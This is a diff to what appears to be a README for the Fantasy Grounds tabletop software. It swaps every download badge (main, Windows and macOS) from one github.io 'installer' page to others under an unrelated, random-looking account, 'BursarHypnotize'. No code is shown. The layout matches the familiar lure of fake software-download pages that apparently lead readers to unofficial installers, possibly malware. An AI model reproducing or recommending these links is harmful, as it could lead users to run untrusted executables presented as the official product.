@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, Fantasy Grounds provides the tools you n
 
 <div align="center">
 
-[![Download Fantasy Grounds](https://img.shields.io/badge/⬇_DOWNLOAD_Fantasy+Grounds-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download Fantasy Grounds](https://img.shields.io/badge/⬇_DOWNLOAD_Fantasy+Grounds-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, Fantasy Grounds provides the tools you n
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://BursarHypnotize.github.io/install-mac/)
 
 </div>
 
